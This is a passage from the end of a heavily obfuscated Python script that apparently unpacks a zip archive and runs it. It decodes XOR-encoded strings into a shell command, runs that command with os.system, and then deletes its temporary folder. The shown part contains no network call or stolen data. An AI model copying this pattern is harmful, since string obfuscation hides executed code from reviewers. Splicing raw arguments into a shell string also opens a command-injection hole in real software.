            210, 193, 210, 217, 223, 208, 193, 212, 200, 186, 165, 243, 175,
            236, 233, 226, 160, 166, 166, 160, 229, 248, 240, 239, 242, 244,
            160, 208, 217, 212, 200, 207, 206, 200, 207, 205, 197, 189, 165,
            243, 160, 166, 166, 160, 229, 248, 240, 239, 242, 244, 160, 208,
            217, 212, 200, 207, 206, 223, 197, 216, 197, 195, 213, 212, 193,
            194, 204, 197, 189, 165, 243, 160, 166, 166, 160, 165, 243, 160,
            165, 243]) % (D.prefix, D.prefix, D.executable, H, (lambda x, y:
            ''.join(chr(q ^ x) for q in y))(44, [12]).join(D.argv[1:]))
        C.system(R)
    except I.BadZipFile:
        G((lambda s: A.join(B(A ^ 206) for A in s))([139, 188, 188, 161, 
            188, 244, 238, 154, 166, 171, 238, 180, 167, 190, 238, 168, 167,
            162, 171, 238, 167, 189, 238, 173, 161, 188, 188, 187, 190, 186,
            171, 170, 238, 161, 188, 238, 160, 161, 186, 238, 175, 238, 180,
            167, 190, 238, 168, 167, 162, 171, 224]))
    except Exception as S:
        G((lambda s: A.join(B(A ^ 195) for A in s))([130, 173, 227, 166, 
            177, 177, 172, 177, 227, 172, 160, 160, 182, 177, 177, 166, 167,
            249, 227, 230, 176]) % S)
    finally:
        L.rmtree(F)


if __name__ == (lambda s: A.join(B(A ^ 30) for A in s))([65, 65, 115, 127, 
    119, 112, 65, 65]):
    W()
